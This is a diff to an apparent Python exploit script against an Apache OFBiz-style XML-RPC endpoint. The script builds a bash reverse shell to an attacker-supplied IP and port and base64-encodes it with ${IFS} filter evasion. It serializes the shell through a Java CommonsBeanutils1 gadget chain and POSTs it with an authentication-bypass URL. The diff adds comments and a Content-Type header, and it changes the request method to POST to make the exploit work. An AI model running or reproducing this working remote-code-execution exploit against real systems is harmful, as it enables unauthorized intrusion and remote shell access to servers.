@@ -47,10 +47,14 @@ def checkArgs(args):
 
 def genPayload(path):
 
+    # TCP revshell oneliner
     revShell = f"bash -i >& /dev/tcp/{sys.argv[3]}/{sys.argv[4]} 0>&1"
+
+    # Base 64 encode and pipe to bash
     encodeShell = base64.b64encode(revShell.encode()).decode()
     bashPipe = f"bash -c echo${{IFS}}{encodeShell}|base64${{IFS}}-d|bash"
 
+    # Serialize bash pipe payload
     try:
         serialShell = subprocess.check_output(["java","-jar",sys.argv[1],"CommonsBeanutils1", bashPipe,])
         serialShell = base64.b64encode(serialShell).decode()
@@ -65,7 +69,9 @@ def getShell(payload, baseURL):
 
     # Define vulnerable request URL. THIS MAY NEED TUNING...
     fullURL = str(baseURL) + "/webtools/control/xmlrpc;/?USERNAME=Y&PASSWORD=Y&requirePasswordChange=Y"
+    header = {'Content-Type': 'application/xml'}
 
+    # XML Wrapper for serialized injection
     reqBody =f"""<?xml version="1.0"?>
 <methodCall>
     <methodName>twopoint</methodName>
@@ -88,8 +94,10 @@ def getShell(payload, baseURL):
     </params>
 </methodCall>
         """
+    
+    # Make request
     try:
-        inject = requests.request(method='get', url=fullURL, data=reqBody, verify=False)
+        inject = requests.post(url=fullURL, data=reqBody, headers=header, verify=False)
     except:
         print(Fore.RED + "[-] Shell request failed. Check URL.")
         sys.exit()
